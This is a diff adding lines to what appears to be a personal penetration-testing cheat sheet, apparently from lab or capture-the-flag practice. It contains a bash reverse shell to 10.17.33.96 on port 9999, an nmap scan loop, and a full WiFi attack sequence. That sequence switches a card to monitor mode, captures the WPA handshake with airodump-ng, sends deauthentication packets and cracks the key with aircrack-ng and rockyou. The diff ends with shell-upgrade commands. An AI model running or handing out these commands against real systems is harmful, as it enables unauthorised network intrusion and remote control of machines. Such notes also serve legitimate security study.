@@ -2093,3 +2093,41 @@ python3 -m pyftpdlib
 cat ip.text| grep "64 bytes" | cut -d " " -f 4 | tr -d ":"
 
 for ip in $(cat iplist.txt);do sudo nmap -sS -p 80 -T4 $ip & done 
+
+/usr/bin/bash -c  'bash -i >& /dev/tcp/10.17.33.96/9999 0>&1'
+
+// wifi hack //
+
+iw dev
+sudo iw dev wlan2 scan 
+
+sudo ip link set dev wlan2 down
+sudo iw dev wlan2 set type monitor 
+sudo ip link set dev wlan2 up 
+
+sudo iw dev wlan2 info
+
+sudo airodump-ng wlan2
+
+// airodump capture 4way handshake
+sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2
+
+// deauthentication packet send
+sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2
+
+// cracking captured handshake using aircrack-ng in order to get psk
+sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap
+
+//extra wifi config
+wpa_passphrase MalwareM_AP 'ENTER PSK HERE' > config
+sudo wpa_supplicant -B -c config -i wlan2
+
+proper shell 
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+stty raw -echo;fg
+export TER=xMterm
+export TERM=xterm-256color
+
+
+
